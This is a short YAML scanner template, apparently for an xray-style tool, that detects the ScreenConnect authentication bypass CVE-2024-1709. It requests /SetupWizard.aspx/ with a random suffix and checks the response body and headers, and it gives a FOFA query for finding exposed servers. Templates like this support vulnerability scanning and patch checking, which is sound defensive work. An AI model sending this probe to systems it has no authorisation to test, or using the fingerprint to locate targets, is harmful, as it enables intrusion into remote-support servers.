id: poc-yaml-connectwise-screenconnect-authentication-bypass
info:
  name: ConnectWise ScreenConnect 身份认证绕过漏洞(CVE-2024-1709)
  severity: critical
  tags:
  - CVE-2024-1709
  - 两高一弱
  finger: ScreenConnect
  fofa: app="ScreenConnect-Remote-Support-Software"
variables:
  t1: random_str(10)
requests:
- method: GET
  path: /SetupWizard.aspx/{{.t1}}
  expression: status_code == 200 && contains(body,"SetupWizardPage") && contains(body,"ContentPanel
    SetupWizard") && contains(headers,"ScreenConnect")
transport: http
